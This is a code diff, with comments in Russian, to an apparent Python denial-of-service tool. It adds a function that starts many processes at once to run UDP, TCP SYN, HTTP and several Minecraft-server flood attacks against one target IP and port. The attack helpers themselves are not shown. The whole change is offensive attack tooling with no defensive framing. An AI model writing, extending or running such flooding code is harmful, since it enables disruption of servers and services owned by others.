@@ -129,6 +129,29 @@ def http_misc_flood(target_ip, target_port, duration):
         sock.send(headers.encode())
     sock.close()
 
+# Run all protocols
+def run_all_protocols(target_ip, target_port, duration, workers):
+    """Запуск всех протоколов и методов атак."""
+    for _ in range(workers):
+        process_list = []
+        process_list.append(multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration)))
+        process_list.append(multiprocessing.Process(target=tcp_syn_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=mc_cps_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=mc_join_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=mc_ping_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=mc_handshake_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=mc_tcpbypass_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=http_out_flood, args=(target_ip, target_port, duration)))
+        process_list.append(multiprocessing.Process(target=http_misc_flood, args=(target_ip, target_port, duration)))
+        
+        # Запуск процессов
+        for process in process_list:
+            process.start()
+
+        # Ожидание завершения всех процессов
+        for process in process_list:
+            process.join()
+
 def run_attack(target_ip, target_port, protocol, duration, workers):
     """Функция для запуска многопоточной и многопроцессорной атаки."""
     process_list = []
